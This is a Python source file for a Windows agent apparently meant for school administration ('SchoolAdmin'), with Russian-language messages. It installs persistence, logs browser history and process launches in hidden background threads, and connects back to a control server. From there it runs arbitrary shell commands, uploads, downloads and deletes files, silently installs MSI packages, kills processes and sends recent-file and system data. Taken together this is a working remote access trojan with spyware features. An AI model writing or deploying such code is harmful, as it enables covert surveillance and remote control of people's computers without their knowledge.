import socket
import json
import csv
import subprocess
import os
import platform
import time
import threading
import string
import tempfile
import cv2
import struct
import pickle
import tkinter as tk
from tkinter import messagebox, simpledialog
from browser_history import get_chrome_history, get_browser_history
from persistence import install_persistence
from datetime import datetime, timedelta

_chat_root = None


def get_chat_root():
    global _chat_root
    if _chat_root is None:
        _chat_root = tk.Tk()
        _chat_root.withdraw()
    return _chat_root

def history_monitoring_thread():
    log_file = os.path.join(os.getenv('TEMP'), 'history_log.txt')
    known_urls = set()
    
    if os.path.exists(log_file):
        with open(log_file, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    known_urls.add(line.split(" - ")[1].strip())
                except IndexError:
                    continue

    while True:
        try:
            history_data = get_chrome_history()
            if "Ошибка" in history_data or "не найден" in history_data:
                time.sleep(60)
                continue

            new_entries = []
            for line in history_data.split('\n'):
                try:
                    url = line.split(" - ")[1].strip()
                    if url not in known_urls:
                        new_entries.append(line)
                        known_urls.add(url)
                except IndexError:
                    continue
            
            if new_entries:
                with open(log_file, 'a', encoding='utf-8') as f:
                    for entry in reversed(new_entries): 
                        f.write(entry + '\n')
        except Exception:
            pass 
        
        time.sleep(15) 


def get_activity_dir():
    candidates = []
    program_data = os.getenv('PROGRAMDATA')
    if program_data:
        candidates.append(os.path.join(program_data, 'SchoolAdmin'))
    temp_dir = os.getenv('TEMP') or tempfile.gettempdir()
    candidates.append(os.path.join(temp_dir, 'SchoolAdmin'))

    for path in candidates:
        try:
            os.makedirs(path, exist_ok=True)
            return path
        except Exception:
            continue
    return tempfile.gettempdir()


def get_activity_log_path():
    return os.path.join(get_activity_dir(), 'activity_log.jsonl')


def append_activity_event(event):
    try:
        event.setdefault('datetime', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        with open(get_activity_log_path(), 'a', encoding='utf-8') as f:
            f.write(json.dumps(event, ensure_ascii=False) + '\n')
    except Exception:
        pass


def read_current_processes():
    processes = []
    try:
        creationflags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        result = subprocess.run(
            'tasklist /FO CSV /NH',
            shell=True,
            capture_output=True,
            text=True,
            creationflags=creationflags,
            timeout=20
        )
        for row in csv.reader(result.stdout.splitlines()):
            if len(row) >= 2:
                processes.append({'name': row[0], 'pid': row[1]})
    except Exception:
        pass
    return processes


def process_activity_monitor_thread():
    known_pids = set()
    for proc in read_current_processes():
        known_pids.add(proc.get('pid'))

    while True:
        try:
            current = read_current_processes()
            current_pids = set()
            for proc in current:
                pid = proc.get('pid')
                name = proc.get('name') or ''
                current_pids.add(pid)
                if pid and pid not in known_pids:
                    append_activity_event({
                        'type': 'process_start',
                        'title': 'Запущено приложение',
                        'process': name,
                        'pid': pid,
                        'details': f'{name} (PID: {pid})'
                    })
            known_pids = current_pids
        except Exception:
            pass
        time.sleep(3)


def get_recent_activity_events(limit=300):
    rows = []
    path = get_activity_log_path()
    try:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()[-limit:]
            for line in lines:
                try:
                    rows.append(json.loads(line))
                except Exception:
                    continue
    except Exception:
        pass
    return rows


def get_recent_files(days=7, max_items=300):
    items = []
    try:
        home = os.path.expanduser('~')
        folders = [
            ('Downloads', os.path.join(home, 'Downloads')),
            ('Desktop', os.path.join(home, 'Desktop')),
            ('Documents', os.path.join(home, 'Documents')),
        ]
        since = time.time() - days * 86400
        for folder_name, folder_path in folders:
            if not os.path.isdir(folder_path):
                continue
            for root, dirs, files in os.walk(folder_path):
                rel = os.path.relpath(root, folder_path)
                if rel.count(os.sep) >= 2:
                    dirs[:] = []
                for fname in files:
                    full_path = os.path.join(root, fname)
                    try:
                        st = os.stat(full_path)
                    except Exception:
                        continue
                    if max(st.st_mtime, st.st_ctime) < since:
                        continue
                    items.append({
                        'datetime': datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                        'type': 'recent_file',
                        'title': 'Файл изменён/загружен',
                        'folder': folder_name,
                        'name': fname,
                        'path': full_path,
                        'size': st.st_size,
                        'details': full_path
                    })
        items.sort(key=lambda x: x.get('datetime', ''), reverse=True)
    except Exception:
        pass
    return items[:max_items]


def get_msi_events(max_items=80):
    events = []
    try:
        ps = (
            "Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='MsiInstaller'} "
            "-MaxEvents %d | Select-Object TimeCreated, Id, ProviderName, Message | ConvertTo-Json -Depth 3"
        ) % max_items
        creationflags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        proc = subprocess.run(
            ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps],
            capture_output=True,
            text=True,
            timeout=25,
            creationflags=creationflags
        )
        raw = (proc.stdout or '').strip()
        if raw:
            data = json.loads(raw)
            if isinstance(data, dict):
                data = [data]
            for item in data:
                msg = (item.get('Message') or '').replace('\r', ' ').replace('\n', ' ')
                dt = item.get('TimeCreated') or ''
                events.append({
                    'datetime': str(dt).replace('T', ' ')[:19],
                    'type': 'msi_event',
                    'title': 'Событие установки MSI',
                    'event_id': item.get('Id', ''),
                    'details': msg[:1500]
                })
    except Exception:
        pass
    return events


def build_recent_activity_payload():
    activity = get_recent_activity_events(limit=400)
    files = get_recent_files(days=7, max_items=300)
    msi = get_msi_events(max_items=80)
    return {
        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'activity_log_path': get_activity_log_path(),
        'activity': activity,
        'recent_files': files,
        'msi_events': msi,
    }

def main():
    install_persistence()

    monitor_thread = threading.Thread(target=history_monitoring_thread, daemon=True)
    monitor_thread.start()

    activity_thread = threading.Thread(target=process_activity_monitor_thread, daemon=True)
    activity_thread.start()

    host = '127.0.0.1' 
    port = 9999        

    while True: 
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))

            pc_name = socket.gethostname()
            user = os.getlogin()
            os_info = f"{platform.system()} {platform.release()}"
            info_packet = f"PC_INFO::{pc_name}::{user}::{os_info}"
            client_socket.send(info_packet.encode('utf-8'))

            while True:
                command_raw = client_socket.recv(1024).decode('utf-8')
                if not command_raw:
                    break
                
                command = command_raw.strip()

                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:])
                        output = f"Директория изменена на: {os.getcwd()}"
                        client_socket.send(output.encode('utf-8'))
                    except FileNotFoundError:
                        output = "Директория не найдена."
                        client_socket.send(output.encode('utf-8'))
                    continue
                elif command.startswith('UPLOAD '):
                    filepath = command.split(' ', 1)[1]
                    try:
                        with open(filepath, 'wb') as f:
                            while True:
                                bytes_read = client_socket.recv(4096)
                                if bytes_read.endswith(b"DONE_UPLOADING"):
                                    f.write(bytes_read[:-14])
                                    break
                                f.write(bytes_read)
                    except Exception:
                        pass
                    continue
                elif command.startswith('DOWNLOAD '):
                    filepath = command.split(' ', 1)[1]
                    if os.path.exists(filepath):
                        with open(filepath, 'rb') as f:
                            while True:
                                bytes_read = f.read(4096)
                                if not bytes_read:
                                    break
                                client_socket.sendall(bytes_read)
                        time.sleep(0.1)
                        client_socket.send(b"DONE_DOWNLOADING")
                    else:
                        client_socket.send(b"FILE_NOT_FOUND")
                    continue
                elif command.startswith('GET_BROWSER_HISTORY'):
                    try:
                        parts = command.split(' ', 2)
                        target_date = parts[1] if len(parts) > 1 and parts[1] != 'ALL_DATES' else None
                        browser_filter = parts[2] if len(parts) > 2 else 'ALL'

                        history_data = get_browser_history(
                            target_date=target_date,
                            browser_filter=browser_filter,
                            limit=20000
                        )
                        payload = json.dumps(history_data, ensure_ascii=False).encode('utf-8', errors='ignore')
                        header = f"BROWSER_HISTORY::{len(payload)}\n".encode('ascii')
                        client_socket.sendall(header + payload)
                    except Exception as e:
                        payload = json.dumps({"entries": [], "errors": [str(e)]}, ensure_ascii=False).encode('utf-8')
                        header = f"BROWSER_HISTORY::{len(payload)}\n".encode('ascii')
                        client_socket.sendall(header + payload)
                    continue
                elif command == 'GET_HISTORY':
                    log_file = os.path.join(os.getenv('TEMP'), 'history_log.txt')
                    if os.path.exists(log_file):
                        with open(log_file, 'rb') as f:
                            client_socket.sendall(f.read())
                    else:
                        client_socket.send("Лог файл истории пуст.".encode('utf-8'))
                    continue
                elif command == 'LIST_DRIVES':
                    try:
                        drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:")]
                        response = "DRIVES::" + "::".join(drives)
                        client_socket.send(response.encode('utf-8'))
                    except Exception as e:
                        client_socket.send(f"Ошибка получения дисков: {e}".encode('utf-8'))
                    continue
                elif command.startswith('LIST_DIR '):
                    try:
                        path = command.split(' ', 1)[1]
                        items = []
                        for item in os.listdir(path):
                            full_path = os.path.join(path, item)
                            item_type = "DIR" if os.path.isdir(full_path) else "FILE"
                            items.append(f"{item_type}::{item}")
                        response = "DIR_CONTENT::" + "||".join(items)
                        client_socket.sendall(response.encode('utf-8'))
                    except Exception as e:
                        client_socket.send(f"Ошибка чтения директории: {e}".encode('utf-8'))
                    continue
                elif command == 'LIST_PROCESSES':
                    try:
                        result = subprocess.run(
                            'tasklist /FO CSV /NH',
                            shell=True,
                            capture_output=True,
                            text=True
                        )
                        if result.returncode != 0:
                            payload = f"Ошибка получения списка процессов: {result.stderr}".encode('utf-8', errors='ignore')
                        else:
                            payload = result.stdout.encode('utf-8', errors='ignore')

                        header = f"PROCESS_LIST::{len(payload)}\n".encode('ascii')
                        client_socket.sendall(header + payload)
                    except Exception as e:
                        payload = f"Ошибка получения списка процессов: {e}".encode('utf-8', errors='ignore')
                        header = f"PROCESS_LIST::{len(payload)}\n".encode('ascii')
                        client_socket.sendall(header + payload)
                    continue
                elif command.startswith('KILL_PROCESS '):
                    pid_str = command.split(' ', 1)[1]
                    try:
                        pid = int(pid_str)
                        proc = subprocess.run(
                            f'taskkill /PID {pid} /F',
                            shell=True,
                            capture_output=True,
                            text=True
                        )
                        if proc.returncode == 0:
                            msg = f"Процесс {pid} завершен.\n{proc.stdout}"
                        else:
                            msg = f"Не удалось завершить процесс {pid}.\n{proc.stderr}"
                        client_socket.send(msg.encode('utf-8', errors='ignore'))
                    except ValueError:
                        client_socket.send(f"Некорректный PID: {pid_str}".encode('utf-8'))
                    except Exception as e:
                        client_socket.send(f"Ошибка завершения процесса: {e}".encode('utf-8'))
                    continue

                elif command.startswith('INSTALL_MSI::'):
                    try:
                        parts = command.split('::', 2)
                        if len(parts) != 3:
                            raise ValueError('Некорректный заголовок INSTALL_MSI')

                        original_name = os.path.basename(parts[1]) or 'package.msi'
                        if not original_name.lower().endswith('.msi'):
                            raise ValueError('Разрешены только MSI-файлы')

                        file_size = int(parts[2])
                        if file_size <= 0:
                            raise ValueError('Пустой MSI-файл')

                        temp_dir = os.path.join(tempfile.gettempdir(), 'school_admin_msi')
                        os.makedirs(temp_dir, exist_ok=True)
                        msi_path = os.path.join(temp_dir, original_name)

                        client_socket.sendall(b'READY_FOR_MSI')

                        received = 0
                        with open(msi_path, 'wb') as f:
                            while received < file_size:
                                chunk = client_socket.recv(min(65536, file_size - received))
                                if not chunk:
                                    break
                                f.write(chunk)
                                received += len(chunk)

                        if received != file_size:
                            raise IOError(f'Файл получен не полностью: {received}/{file_size} байт')

                        log_path = os.path.join(
                            temp_dir,
                            os.path.splitext(original_name)[0] + '_install.log'
                        )

                        cmd = [
                            'msiexec.exe',
                            '/i', msi_path,
                            '/qn',
                            '/norestart',
                            '/L*v', log_path
                        ]

                        creationflags = 0
                        if hasattr(subprocess, 'CREATE_NO_WINDOW'):
                            creationflags = subprocess.CREATE_NO_WINDOW

                        proc = subprocess.run(
                            cmd,
                            capture_output=True,
                            text=True,
                            timeout=1800,
                            creationflags=creationflags
                        )

                        log_tail = ''
                        if os.path.exists(log_path):
                            try:
                                with open(log_path, 'r', encoding='utf-8', errors='ignore') as log_file:
                                    log_tail = log_file.read()[-12000:]
                            except Exception as log_error:
                                log_tail = f'Не удалось прочитать MSI-лог: {log_error}'

                        msi_codes = {
                            0: 'Установка успешно завершена',
                            1603: 'MSI 1603: критическая ошибка установки. Частые причины: нет прав администратора, программа уже установлена/запущена, запрещена установка политиками, не хватает прав на папку TEMP или MSI требует дополнительные параметры.',
                            1618: 'MSI 1618: уже выполняется другая установка Windows Installer.',
                            1619: 'MSI 1619: пакет MSI не удалось открыть.',
                            1638: 'MSI 1638: уже установлена другая версия этого продукта.',
                            3010: 'MSI 3010: установка завершена, требуется перезагрузка.'
                        }

                        result = {
                            'ok': proc.returncode in (0, 3010),
                            'returncode': proc.returncode,
                            'message': msi_codes.get(proc.returncode, f'msiexec вернул код {proc.returncode}'),
                            'file': original_name,
                            'log_path': log_path,
                            'log_tail': log_tail,
                            'stdout': proc.stdout[-4000:] if proc.stdout else '',
                            'stderr': proc.stderr[-4000:] if proc.stderr else ''
                        }
                    except Exception as e:
                        result = {
                            'ok': False,
                            'returncode': -1,
                            'file': '',
                            'stdout': '',
                            'stderr': str(e)
                        }

                    payload = json.dumps(result, ensure_ascii=False).encode('utf-8', errors='ignore')
                    header = f"INSTALL_MSI_RESULT::{len(payload)}\n".encode('ascii')
                    client_socket.sendall(header + payload)
                    continue
                elif command == 'GET_RECENT_ACTIVITY':
                    try:
                        data = build_recent_activity_payload()
                        payload = json.dumps(data, ensure_ascii=False).encode('utf-8', errors='ignore')
                        header = f"RECENT_ACTIVITY::{len(payload)}\n".encode('ascii')
                        client_socket.sendall(header + payload)
                    except Exception as e:
                        payload = json.dumps({'error': str(e), 'activity': [], 'recent_files': [], 'msi_events': []}, ensure_ascii=False).encode('utf-8', errors='ignore')
                        header = f"RECENT_ACTIVITY::{len(payload)}\n".encode('ascii')
                        client_socket.sendall(header + payload)
                    continue
                elif command == 'SYSINFO':
                    try:
                        result = subprocess.run(
                            'systeminfo',
                            shell=True,
                            capture_output=True,
                            text=False
                        )
                        try:
                            output = result.stdout.decode('cp866')
                        except UnicodeDecodeError:
                            output = result.stdout.decode('utf-8', errors='ignore')
                        if not output:
                            try:
                                output = result.stderr.decode('cp866')
                            except UnicodeDecodeError:
                                output = result.stderr.decode('utf-8', errors='ignore')
                        if not output:
                            output = "Команда systeminfo не вернула данных."
                    except Exception as e:
                        output = f"Ошибка получения системной информации: {e}"
                    client_socket.send(output.encode('utf-8', errors='ignore'))
                    continue
                elif command == 'NETSTAT':
                    try:
                        result = subprocess.run(
                            'netstat -ano',
                            shell=True,
                            capture_output=True,
                            text=False
                        )
                        try:
                            output = result.stdout.decode('cp866')
                        except UnicodeDecodeError:
                            output = result.stdout.decode('utf-8', errors='ignore')
                        if not output:
                            try:
                                output = result.stderr.decode('cp866')
                            except UnicodeDecodeError:
                                output = result.stderr.decode('utf-8', errors='ignore')
                        if not output:
                            output = "Команда netstat не вернула данных."
                    except Exception as e:
                        output = f"Ошибка получения сетевых соединений: {e}"
                    client_socket.send(output.encode('utf-8', errors='ignore'))
                    continue
                elif command == 'LIST_STARTUP':
                    lines = []
                    try:
                        import winreg
                        for root, root_name in (
                            (winreg.HKEY_CURRENT_USER, "HKCU"),
                            (winreg.HKEY_LOCAL_MACHINE, "HKLM"),
                        ):
                            try:
                                key = winreg.OpenKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run")
                                lines.append(f"[{root_name}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]")
                                i = 0
                                while True:
                                    try:
                                        name, value, _ = winreg.EnumValue(key, i)
                                        lines.append(f"{name} = {value}")
                                        i += 1
                                    except OSError:
                                        break
                                winreg.CloseKey(key)
                            except OSError:
                                continue
                    except Exception as e:
                        lines.append(f"Ошибка чтения автозапуска из реестра: {e}")

                    try:
                        startup_dir = os.path.join(
                            os.getenv('APPDATA') or "",
                            r"Microsoft\Windows\Start Menu\Programs\Startup"
                        )
                        lines.append("")
                        lines.append("[Папка автозагрузки]")
                        lines.append(startup_dir)
                        if os.path.isdir(startup_dir):
                            for fname in os.listdir(startup_dir):
                                lines.append(f"- {fname}")
                        else:
                            lines.append("Папка не найдена или недоступна.")
                    except Exception as e:
                        lines.append(f"Ошибка чтения папки автозагрузки: {e}")

                    output = "\n".join(lines).strip() or "Автозагрузка пуста или недоступна."
                    client_socket.send(output.encode('utf-8', errors='ignore'))
                    continue
                elif command.startswith('CHAT_MSG::'):
                    text = command.split('CHAT_MSG::', 1)[1]
                    try:
                        root = get_chat_root()
                        messagebox.showinfo("Сообщение от администратора", text, parent=root)
                        reply = simpledialog.askstring("Ответ администратору", "Введите сообщение:", parent=root)
                        if reply:
                            client_socket.send(f"CHAT_FROM_AGENT::{reply}".encode('utf-8'))
                        else:
                            client_socket.send("CHAT_FROM_AGENT::[без ответа]".encode('utf-8'))
                    except Exception as e:
                        client_socket.send(f"CHAT_FROM_AGENT::Ошибка отображения сообщения: {e}".encode('utf-8'))
                    continue
                elif command.startswith('DELETE '):
                    filepath = command.split(' ', 1)[1]
                    try:
                        if os.path.isfile(filepath):
                            os.remove(filepath)
                            client_socket.send(f"Файл удален: {filepath}".encode('utf-8'))
                        else:
                            client_socket.send(f"Файл не найден или это не файл: {filepath}".encode('utf-8'))
                    except Exception as e:
                        client_socket.send(f"Ошибка удаления файла: {e}".encode('utf-8'))
                    continue
                elif command.startswith('EXECUTE '):
                    filepath = command.split(' ', 1)[1]
                    try:
                        subprocess.Popen(filepath, shell=True)
                    except Exception:
                        pass
                    continue

                else:
                    try:
                        result = subprocess.run(command_raw, shell=True, capture_output=True, text=False, timeout=30)
                        try:
                            output = result.stdout.decode('cp866')
                        except UnicodeDecodeError:
                            output = result.stdout.decode('utf-8', errors='ignore')
                        try:
                            stderr_output = result.stderr.decode('cp866')
                        except UnicodeDecodeError:
                            stderr_output = result.stderr.decode('utf-8', errors='ignore')
                        if stderr_output:
                            output += "\n" + stderr_output
                    except Exception as e:
                        output = f"Ошибка выполнения команды: {e}"
                    if not output:
                        output = "Команда выполнена, но не вернула результат."
                    client_socket.send(output.encode('utf-8'))

        except (ConnectionResetError, ConnectionAbortedError, ConnectionRefusedError, BrokenPipeError, TimeoutError):
            time.sleep(10)
        except Exception:
            time.sleep(10)

if __name__ == "__main__":
    main()
